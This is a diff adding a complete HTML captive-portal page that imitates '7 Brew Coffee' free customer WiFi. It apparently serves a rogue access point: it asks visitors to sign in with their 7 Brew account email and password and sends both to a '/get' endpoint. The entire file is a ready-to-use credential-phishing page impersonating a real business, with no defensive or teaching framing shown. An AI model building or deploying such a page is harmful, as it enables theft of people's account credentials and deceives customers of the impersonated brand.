@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+<title>7 Brew Coffee WiFi</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;background:#1a1a1a;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+.card{width:100%;max-width:400px;background:#1a1a1a;border:1px solid #2a2a2a;border-radius:16px;overflow:hidden;box-shadow:0 16px 50px rgba(0,0,0,0.6)}
+.top{background:#1a1a1a;padding:26px 24px 18px;text-align:center;border-bottom:1px solid #2a2a2a}
+.num{font-size:52px;font-weight:900;color:#fff;line-height:1}
+.brew{font-size:14px;font-weight:700;color:#aaa;letter-spacing:4px;text-transform:uppercase;margin-top:4px}
+.tagline{font-size:9.5px;color:#555;letter-spacing:2px;text-transform:uppercase;margin-top:5px}
+.mid{background:#111;padding:8px 24px;display:flex;align-items:center;gap:8px;border-bottom:1px solid #2a2a2a}
+.dot{width:6px;height:6px;background:#4ade80;border-radius:50%;flex-shrink:0}
+.mid span{font-size:11px;color:#555}
+.mid strong{color:#aaa}
+.body{padding:24px}
+h2{font-size:17px;font-weight:700;color:#e0e0e0;margin-bottom:3px}
+.sub{font-size:12.5px;color:#555;margin-bottom:4px}
+.lbl{display:block;font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:1.5px;color:#555;margin-bottom:6px;margin-top:18px}
+input{width:100%;padding:12px 14px;border:1px solid #2a2a2a;border-radius:8px;font-size:14.5px;background:#111;color:#e0e0e0;font-family:inherit}
+input:focus{outline:none;border-color:#fff;box-shadow:0 0 0 3px rgba(255,255,255,0.05)}
+input::placeholder{color:#333}
+.btn{width:100%;padding:13px;margin-top:20px;border:none;border-radius:8px;background:#fff;color:#1a1a1a;font-size:13px;font-weight:800;cursor:pointer}
+.terms{font-size:11px;color:#444;text-align:center;margin-top:12px;line-height:1.6}
+.terms a{color:#aaa}
+.foot{background:#111;border-top:1px solid #2a2a2a;padding:11px 24px;display:flex;justify-content:space-between}
+.foot span,.foot a{font-size:10.5px;color:#444;text-decoration:none}
+.foot a{color:#aaa}
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="top">
+    <div class="num">7</div>
+    <div class="brew">BREW COFFEE</div>
+    <div class="tagline">Free Customer WiFi</div>
+  </div>
+  <div class="mid"><div class="dot"></div><span>Network: <strong>7Brew_WiFi</strong></span></div>
+  <div class="body">
+    <h2>Guest Access</h2>
+    <p class="sub">Sign in with your 7 Brew account to get connected.</p>
+    <form action="/get">
+      <label class="lbl">Email Address</label>
+      <input name="email" type="text" placeholder="you@example.com" required>
+      <label class="lbl">Password</label>
+      <input name="password" type="password" placeholder="Enter your password" required>
+      <button type="submit" class="btn">Connect Now</button>
+      <p class="terms">By connecting you agree to our <a href="#">Terms of Use</a>.</p>
+    </form>
+  </div>
+  <div class="foot"><span>&copy; 7 Brew Coffee</span><a href="#">Help</a></div>
+</div>
+</body>
+</html>
